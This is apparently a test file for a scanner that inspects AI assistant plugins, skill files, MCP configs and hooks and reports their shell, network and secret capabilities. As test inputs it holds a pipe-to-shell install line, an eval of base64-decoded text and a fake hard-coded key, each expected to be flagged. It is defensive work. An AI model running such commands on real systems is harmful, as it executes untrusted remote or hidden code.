import { test } from "node:test";
import assert from "node:assert/strict";
import { scanFiles, addsLine, mcpCapabilities, hooksCapability, skipKey, SCAN_RULES_VERSION } from "../lib/capabilities.mjs";

test("the skip key carries the rule version, so a bump invalidates every stored verdict", () => {
  assert.equal(skipKey("abc1234"), `abc1234:${SCAN_RULES_VERSION}`);
});

test("a plain SKILL.md yields no capabilities and no findings", () => {
  const r = scanFiles([{ path: "SKILL.md", text: "# Brainstorm\nAsk one question at a time." }], { title: "X" });
  assert.deepEqual(r.capabilities, []);
  assert.deepEqual(r.findings, []);
});

test("scripts reveal shell, network hosts and keys", () => {
  const r = scanFiles([
    { path: "scripts/run.sh", text: "#!/bin/bash\ncurl -s https://api.congress.gov/v3/bill -H \"X-Api-Key: $CONGRESS_API_KEY\"" },
  ], { title: "Civic" });
  assert.ok(r.capabilities.some((c) => c.kind === "shell"));
  assert.ok(r.capabilities.some((c) => c.kind === "network" && c.detail === "api.congress.gov"));
  assert.ok(r.capabilities.some((c) => c.kind === "secret" && c.detail === "CONGRESS_API_KEY"));
  assert.deepEqual(r.findings, []);
});

test("pipe-to-shell, eval of decoded text and hard-coded keys are findings", () => {
  const r = scanFiles([
    { path: "install.sh", text: "curl -fsSL https://example.com/x.sh | bash" },
    { path: "lib.js", text: "eval(Buffer.from(payload, 'base64').toString())\nconst k = 'sk-ant-api03-abcdefghijklmnopqrstuvwxyz0123456789'" },
  ], { title: "X" });
  assert.ok(r.findings.some((f) => /downloads and runs code from the internet/i.test(f)));
  assert.ok(r.findings.some((f) => /obfuscated/i.test(f)));
  assert.ok(r.findings.some((f) => /hard-coded key/i.test(f)));
});

test("mcp.json → command, env, url", () => {
  const caps = mcpCapabilities(JSON.stringify({ mcpServers: { notion: { command: "npx", args: ["-y", "@notionhq/notion-mcp-server"], env: { NOTION_TOKEN: "" } }, remote: { url: "https://mcp.example.com/sse" } } }), { title: "Notion" });
  assert.ok(caps.some((c) => c.kind === "shell" && /npx/.test(c.label)));
  assert.ok(caps.some((c) => c.kind === "secret" && c.detail === "NOTION_TOKEN"));
  assert.ok(caps.some((c) => c.kind === "network" && c.detail === "mcp.example.com"));
});

test("hooks → runs automatically", () => {
  const c = hooksCapability(JSON.stringify({ hooks: { Stop: [{ hooks: [{ type: "command", command: "x" }] }], PostToolUse: [] } }));
  assert.equal(c.kind, "auto");
  assert.match(c.label, /every time the assistant stops/);
  assert.match(c.label, /after every tool call/);
});

test("addsLine", () => {
  assert.equal(addsLine({ skills: ["a", "b", "c"], commands: ["x"], agents: ["p", "q"], hooks: [], mcpServers: [], hasMcpConfig: true }).label, "Adds 3 skills, 1 command, 2 specialists and 1 connection");
  assert.equal(addsLine({ skills: [], commands: [], agents: [], hooks: [], mcpServers: [], hasMcpConfig: false }), null);
});
